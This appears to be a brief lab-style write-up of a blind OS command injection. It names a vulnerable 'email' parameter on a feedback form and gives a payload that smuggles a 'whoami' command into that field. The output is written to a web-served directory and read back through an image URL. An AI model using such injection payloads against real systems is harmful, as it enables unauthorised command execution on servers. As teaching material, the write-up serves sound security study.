    vulnerable parameter: 'email' parameter in post request at '/feedback/submit'

    Directory location serve by application: '/var/www/images/'
    how to access the files stored in accessible directory: '/image?filename=output.txt'

***Exploitation***
  payload="me@me.com & whoami > /var/www/images/output.txt #"
